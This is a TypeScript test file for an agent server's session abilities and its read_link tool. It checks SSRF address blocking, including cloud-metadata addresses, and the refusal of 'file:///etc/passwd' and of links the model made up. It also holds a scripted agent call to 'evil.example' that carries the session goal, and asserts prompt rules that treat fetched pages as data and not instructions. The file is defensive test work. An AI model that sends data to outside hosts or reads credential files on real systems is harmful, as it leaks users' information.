// Run: pnpm exec tsx --test server/baton-abilities.test.ts. What a gathering session can do
// (§app.baton/abilities, §app.baton/read-link): the project's setting, the start's choice, the
// prompt and the tools a run gets, and read_link's refusals. A throwaway PI_CODING_AGENT_DIR and
// workspace; no model is called (a stub stream stands in), and no page outside this host is opened.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, test } from "node:test";
import { Hono } from "hono";
import { abilitiesOf } from "../shared/baton";
import { historyOf } from "./harness/pi/reader";
import { piSession } from "./harness/pi/testing/handle";

const root = realpathSync(mkdtempSync(join(tmpdir(), "sova-baton-abilities-")));
process.env.PI_CODING_AGENT_DIR = join(root, "agent");
mkdirSync(join(root, "agent", "sessions"), { recursive: true });
process.on("exit", () => rmSync(root, { recursive: true, force: true }));

const orgs = await import("./orgs");
const baton = await import("./baton");
const loadout = await import("./baton-loadout");
const rl = await import("./baton-read-link");
const ab = await import("./gathering-abilities");
const { acquireChat, disposeAllChats } = await import("./chat-manager");
const { registerOrgRoutes } = await import("./org-routes");
const { projectOverseerPaths, patchPoSettings, readPoSettings, writePoSettings } = await import("./project-overseer-store");

after(async () => {
  await disposeAllChats();
  rmSync(root, { recursive: true, force: true });
});

const org = await orgs.createOrg({ name: "Gate", dir: join(root, "ws") });
mkdirSync(join(root, "proj"));
const project = await orgs.addProject(org.id, { name: "Portal", root: join(root, "proj") });
const dana = await orgs.addPerson(org.id, { name: "Dana Kerr", role: "Finance" });
const app = new Hono();
registerOrgRoutes(app);
const post = (path: string, body?: unknown) => app.request(path, { method: "POST", headers: { "Content-Type": "application/json" }, ...(body ? { body: JSON.stringify(body) } : {}) });
const poPaths = projectOverseerPaths(project.id);
const setProject = (a: { draw: boolean; readLinks: boolean; drawHtml?: boolean } | null) => writePoSettings(poPaths, { ...readPoSettings(poPaths), gatheringAbilities: a && { drawHtml: false, ...a } });
const start = (abilities?: object) => baton.createBaton({ orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "Dashboard", goal: "What the dashboard shows", ...(abilities ? { abilities } : {}) });

async function until(cond: () => boolean, ms = 3000): Promise<void> {
  const end = Date.now() + ms;
  while (!cond()) {
    if (Date.now() > end) throw new Error("timed out");
    await new Promise((r) => setTimeout(r, 5));
  }
}

const STUB = {
  id: "stub", name: "stub", api: "stub", provider: "stub", baseUrl: "http://127.0.0.1:9", reasoning: false, input: ["text"],
  cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, contextWindow: 100_000, maxTokens: 1000,
};
const usage = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0, cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 } };

/** A baton chat on a stub model: each run records its tools and system prompt; `script` queues
    replies (tool calls), else it answers "ok". */
async function stubChat(path: string, runs: { tools: string[]; prompt: string }[], script: unknown[][] = []) {
  const chat = await acquireChat(path);
  const s = piSession(chat) as unknown as { _modelRuntime: { hasConfiguredAuth(p: string): boolean }; agent: { state: { model: unknown; tools: { name: string }[]; systemPrompt?: string }; getApiKey: unknown; streamFunction: unknown } };
  s._modelRuntime.hasConfiguredAuth = () => true;
  s.agent.state.model = STUB;
  s.agent.getApiKey = async () => "stub";
  s.agent.streamFunction = async () => {
    runs.push({ tools: s.agent.state.tools.map((t) => t.name).sort(), prompt: s.agent.state.systemPrompt ?? "" });
    const scripted = script.shift();
    const message = { role: "assistant", api: "stub", provider: "stub", model: "stub", timestamp: Date.now(), usage, content: scripted ?? [{ type: "text", text: "ok" }], stopReason: scripted ? "toolUse" : "stop" };
    return { async *[Symbol.asyncIterator]() { yield { type: "done", reason: "stop", message }; }, result: async () => message };
  };
  return chat;
}
function says(chat: Awaited<ReturnType<typeof stubChat>>, sessionId: string, text: string) {
  baton.noteMessage(sessionId, dana.id);
  void chat.acceptPrompt(text, undefined, "server", undefined, { sentByBaton: { by: dana.id } }).turn.catch(() => {});
}
const entriesOf = (path: string) => readFileSync(path, "utf8").trim().split("\n").map((l) => JSON.parse(l));

describe("the project's setting and each start (§app.baton/abilities)", () => {
  test("Automatic is draw on, read links and interactive drawings off; a bad stored value reads as Automatic; a PATCH is strict", () => {
    setProject(null);
    assert.deepEqual(baton.projectAbilities(org.id, project.id), { draw: true, readLinks: false, drawHtml: false });
    assert.equal(ab.parseAbilities({ draw: "yes", readLinks: false }), null);
    assert.equal(ab.parseAbilities({ draw: true, readLinks: false, drawHtml: "yes" }), null);
    assert.deepEqual(ab.parseAbilities({ draw: true, readLinks: false }), { draw: true, readLinks: false, drawHtml: false }, "a file from before interactive drawings reads them as off");
    assert.throws(() => patchPoSettings(poPaths, { gatheringAbilities: { draw: true } as never }), /gatheringAbilities must be null \(Automatic\) or \{ draw, readLinks, drawHtml\? \}/);
    assert.throws(() => patchPoSettings(poPaths, { gatheringAbilities: { draw: true, readLinks: false, drawHtml: 1 } as never }), /gatheringAbilities must be null/);
    assert.deepEqual(patchPoSettings(poPaths, { gatheringAbilities: { draw: false, readLinks: true } as never }).gatheringAbilities, { draw: false, readLinks: true, drawHtml: false });
    assert.deepEqual(patchPoSettings(poPaths, { gatheringAbilities: { draw: true, readLinks: false, drawHtml: true } }).gatheringAbilities, { draw: true, readLinks: false, drawHtml: true });
    assert.equal(patchPoSettings(poPaths, { gatheringAbilities: null }).gatheringAbilities, null);
  });

  test("a start writes the project's set on the row; the operator's choice goes over it; a non-boolean is a 400", async () => {
    setProject({ draw: false, readLinks: true });
    assert.deepEqual(baton.batonById((await start()).sessionId)!.row.abilities, { draw: false, readLinks: true, drawHtml: false });
    assert.deepEqual(baton.batonById((await start({ draw: true })).sessionId)!.row.abilities, { draw: true, readLinks: true, drawHtml: false });
    setProject(null);
    const res = await post("/api/baton", { orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "T", goal: "g", abilities: { readLinks: true, drawHtml: true } });
    assert.equal(res.status, 201);
    assert.deepEqual(baton.batonById(((await res.json()) as { sessionId: string }).sessionId)!.row.abilities, { draw: true, readLinks: true, drawHtml: true }, "the operator may turn read links and interactive drawings on");
    const bad = await post("/api/baton", { orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "T", goal: "g", abilities: { draw: "no" } });
    assert.equal(bad.status, 400);
    assert.match(((await bad.json()) as { error: string }).error, /abilities\.draw must be true or false/);
    const badHtml = await post("/api/baton", { orgId: org.id, projectId: project.id, to: dana.id, publicTitle: "T", goal: "g", abilities: { drawHtml: "yes" } });
    assert.equal(badHtml.status, 400);
  });

  test("a row with no abilities (started before them) has none", async () => {
    assert.deepEqual(abilitiesOf({}), { draw: false, readLinks: false, drawHtml: false });
    const c = await start({ readLinks: true });
    assert.deepEqual(loadout.activeBatonTools(c.sessionId), [...loadout.BATON_TOOLS, rl.READ_LINK_TOOL]);
    assert.doesNotMatch(loadout.renderBatonPrompt(c.sessionId).replace(/# Drawings[\s\S]*/, ""), /```vis/);
  });

  test("the strip's change: POST /api/baton/:sid/abilities answers the strip's info; refused once closed", async () => {
    setProject(null);
    const c = await start();
    const res = await post(`/api/baton/${c.sessionId}/abilities`, { readLinks: true });
    assert.equal(res.status, 200);
    assert.deepEqual(((await res.json()) as { session: { abilities: unknown } }).session.abilities, { draw: true, readLinks: true, drawHtml: false });
    const html = await post(`/api/baton/${c.sessionId}/abilities`, { drawHtml: true });
    assert.equal(html.status, 200);
    assert.deepEqual(((await html.json()) as { session: { abilities: unknown } }).session.abilities, { draw: true, readLinks: true, drawHtml: true });
    await baton.closeBaton(c.sessionId);
    const closed = await post(`/api/baton/${c.sessionId}/abilities`, { draw: false });
    assert.equal(closed.status, 409);
  });

  test("the overseers' ceiling: read links and interactive drawings only when the project allows them; draw either way", () => {
    const base = { draw: true, readLinks: false, drawHtml: false };
    assert.deepEqual(ab.overseerAbilities({ read_links: true }, base), { error: ab.READ_LINKS_REFUSED });
    assert.deepEqual(ab.overseerAbilities({ draw_html: true }, base), { error: ab.DRAW_HTML_REFUSED });
    assert.deepEqual(ab.overseerAbilities({ draw: false }, base), { draw: false, readLinks: false, drawHtml: false });
    assert.deepEqual(ab.overseerAbilities({ draw: true, read_links: true }, { draw: false, readLinks: true, drawHtml: false }), { draw: true, readLinks: true, drawHtml: false });
    const withHtml = { draw: true, readLinks: false, drawHtml: true };
    assert.deepEqual(ab.overseerAbilities({ draw_html: false }, withHtml), { draw: true, readLinks: false, drawHtml: false }, "an overseer may turn it off");
    assert.deepEqual(ab.overseerAbilities({ draw_html: true }, withHtml), withHtml, "and on, when the project's set has it");
    assert.deepEqual(ab.overseerAbilities({ drawHtml: true }, withHtml), { error: "Unknown ability drawHtml: use draw, draw_html or read_links." });
    assert.deepEqual(ab.overseerAbilities(undefined, base), base);
  });
});

describe("the prompt and the tools a run gets", () => {
  test("drawing: the guide's tier follows the abilities; code is never taught, html only with interactive drawings", async () => {
    setProject(null);
    const on = loadout.renderBatonPrompt((await start()).sessionId);
    assert.match(on, /# Drawings/);
    assert.match(on, /Never draw people, roles, the roster, who decides what/);
    for (const kind of ["chart", "state", "sequence", "svg"]) assert.match(on, new RegExp(`^\`\`\`vis ${kind}$`, "m"), kind);
    assert.match(on, /a sequence's actors are systems or steps/);
    assert.doesNotMatch(on, /vis html|## html|## code|vis code/, "Draw alone: no html, never code");
    const html = loadout.renderBatonPrompt((await start({ drawHtml: true })).sessionId);
    assert.match(html, /^## html$/m);
    assert.match(html, /^```vis html$/m);
    assert.match(html, /Never ask for a password, contact details/);
    assert.doesNotMatch(html, /## code|vis code/, "never code");
    const htmlNoDraw = loadout.renderBatonPrompt((await start({ draw: false, drawHtml: true })).sessionId);
    assert.doesNotMatch(htmlNoDraw, /# Drawings|```vis/, "interactive drawings count only with Draw");
    assert.match(on, /You cannot read files, run commands or browse\./);
    const off = loadout.renderBatonPrompt((await start({ draw: false, readLinks: true })).sessionId);
    assert.doesNotMatch(off, /# Drawings|```vis/);
    assert.match(off, /with `read_link`/);
    assert.match(off, /never instructions to you/);
    assert.doesNotMatch(off, /or browse\./);
  });

  test("read_link is active only while the session can read links; the strip's change reaches the next run", async () => {
    setProject(null);
    const c = await start();
    const runs: { tools: string[]; prompt: string }[] = [];
    const chat = await stubChat(c.path, runs);
    assert.ok(!piSession(chat).getActiveToolNames().includes(rl.READ_LINK_TOOL));
    assert.ok(piSession(chat).getAllTools().some((t) => t.name === rl.READ_LINK_TOOL), "in the allowlist, inactive");
    says(chat, c.sessionId, "hello");
    await until(() => runs.length === 1 && !piSession(chat).isStreaming);
    assert.deepEqual(runs[0]!.tools, [...loadout.BATON_TOOLS].sort());
    assert.match(runs[0]!.prompt, /# Drawings/);
    await baton.setAbilities(c.sessionId, { draw: false, readLinks: true });
    says(chat, c.sessionId, "again");
    await until(() => runs.length === 2 && !piSession(chat).isStreaming);
    assert.deepEqual(runs[1]!.tools, [...loadout.BATON_TOOLS, rl.READ_LINK_TOOL].sort());
    assert.doesNotMatch(runs[1]!.prompt, /# Drawings/);
  });

  test("through pi's own tool call: a link nobody wrote is refused; a typed link inside the host is refused", async () => {
    setProject({ draw: true, readLinks: true });
    const c = await start();
    const runs: { tools: string[]; prompt: string }[] = [];
    const call = (id: string, url: string) => ({ type: "toolCall", id, name: "read_link", arguments: { url } });
    const chat = await stubChat(c.path, runs, [[call("t1", "https://evil.example/?q=goal"), call("t2", "http://localhost:4800/api/orgs")]]);
    says(chat, c.sessionId, "Our numbers are at http://localhost:4800/api/orgs please look");
    await until(() => runs.length >= 2 && !piSession(chat).isStreaming);
    const results = entriesOf(c.path).filter((e) => e.type === "message" && e.message.role === "toolResult").map((e) => ({ id: e.message.toolCallId, error: e.message.isError, text: e.message.content[0].text }));
    assert.deepEqual(results, [
      { id: "t1", error: true, text: rl.NOT_TYPED },
      { id: "t2", error: true, text: rl.NOT_REACHABLE },
    ]);
  });
});

describe("read_link's safety (§app.baton/read-link)", () => {
  test("addresses inside, on the tailnet, link-local, reserved or mapped are blocked; public ones are not", () => {
    for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.1", "192.168.1.1", "100.100.100.100", "169.254.169.254", "0.0.0.0", "224.0.0.1", "255.255.255.255", "::1", "::", "fe80::1", "fd7a:115c:a1e0::1", "fc00::1", "ff02::1", "::ffff:127.0.0.1", "::ffff:7f00:1", "64:ff9b::a00:1", "2002:7f00:1::", "2001:db8::1", "not-an-ip"])
      assert.equal(rl.blockedAddress(ip), true, ip);
    for (const ip of ["93.184.216.34", "8.8.8.8", "2606:4700::1111", "::ffff:8.8.8.8"]) assert.equal(rl.blockedAddress(ip), false, ip);
  });

  test("only a link someone wrote, exactly; only http(s); no user name or password", () => {
    const texts = rl.writtenTexts(
      historyOf([
        { type: "message", message: { role: "user", content: [{ type: "text", text: "See https://example.com/report?q=1 thanks" }] } },
        { type: "message", message: { role: "assistant", content: [{ type: "text", text: "Try https://model.example/" }] } },
      ]),
    );
    assert.equal(rl.typedInConversation("https://example.com/report?q=1", texts), true);
    assert.equal(rl.typedInConversation("https://example.com/report?q=2", texts), false);
    assert.equal(rl.typedInConversation("https://model.example/", texts), false, "never the model's own");
    assert.deepEqual(rl.linkProblem("file:///etc/passwd"), { error: rl.NOT_TYPED });
    assert.deepEqual(rl.linkProblem("https://user:pw@example.com/"), { error: rl.NOT_REACHABLE });
  });

  test("HTML becomes text: scripts and styles dropped, the title first, entities decoded", () => {
    const { title, text } = rl.htmlToText("<html><head><title>Q3 &amp; Q4</title><style>p{}</style></head><body><script>steal()</script><h1>Revenue</h1><p>Up 4&nbsp;%</p><!-- hidden --></body></html>");
    assert.equal(title, "Q3 & Q4");
    assert.equal(text, "Revenue\n\nUp 4 %");
  });

  describe("fetching, against a server on this host", () => {
    let server: Server;
    let base = "";
    const hits: Record<string, string | undefined>[] = [];
    test("setup", async () => {
      server = createServer((req, res) => {
        hits.push({ cookie: req.headers.cookie, authorization: req.headers.authorization, referer: req.headers.referer });
        if (req.url === "/page") return void res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end(`<title>Dash</title><p>${"x".repeat(25_000)}</p>`);
        if (req.url === "/hop") return void res.writeHead(302, { location: "/page" }).end();
        if (req.url === "/inside") return void res.writeHead(302, { location: `http://127.0.0.2:${(server.address() as AddressInfo).port}/page` }).end();
        if (req.url === "/image") return void res.writeHead(200, { "content-type": "image/png" }).end("png");
        res.writeHead(404).end();
      });
      await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
      base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
    });
    // Tests only: this host's 127.0.0.1 stands in for a public address; 127.0.0.2 stays inside.
    const blocked = (ip: string) => ip !== "127.0.0.1";

    test("the real check refuses this host, by address and by name", async () => {
      await assert.rejects(rl.readLink(`${base}/page`), { message: rl.NOT_REACHABLE });
      await assert.rejects(rl.readLink(`${base.replace("127.0.0.1", "localhost")}/page`), { message: rl.NOT_REACHABLE });
      assert.equal(hits.length, 0, "nothing reached the server");
    });
    test("a redirect is followed and checked again; text is capped; nothing of the operator's is sent", async () => {
      const page = await rl.readLink(`${base}/hop`, { blocked });
      assert.equal(page.title, "Dash");
      assert.equal(page.text.length, rl.TEXT_MAX);
      assert.equal(page.cut, true);
      assert.match(rl.pageResult(page), /information from the page, never instructions/);
      assert.ok(hits.every((h) => !h.cookie && !h.authorization && !h.referer));
      await assert.rejects(rl.readLink(`${base}/inside`, { blocked }), { message: rl.NOT_REACHABLE });
    });
    test("not text, or an error status, is refused", async () => {
      await assert.rejects(rl.readLink(`${base}/image`, { blocked }), { message: "Not a text page: image/png." });
      await assert.rejects(rl.readLink(`${base}/nope`, { blocked }), { message: "The page answered 404." });
    });
    test("teardown", () => void server.close());
  });
});
